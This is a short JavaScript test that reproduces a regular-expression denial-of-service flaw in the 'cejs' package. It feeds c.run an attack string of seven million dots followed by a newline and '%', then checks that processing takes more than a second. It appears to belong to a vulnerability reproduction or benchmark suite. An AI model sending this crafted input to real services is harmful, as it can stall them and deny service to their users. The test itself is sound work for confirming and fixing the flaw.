test("ReDoS in cejs", () => {
  const c = require("cejs");
  const measureTime = require("../utils").measureTime;
  attack_str = ".".repeat(7000000) + "\n%";
  let t = measureTime(function () {
    c.run(attack_str);
  });
  let time = t[0] + t[1] / 1000000000;
  expect(time).toBeGreaterThan(1);
});
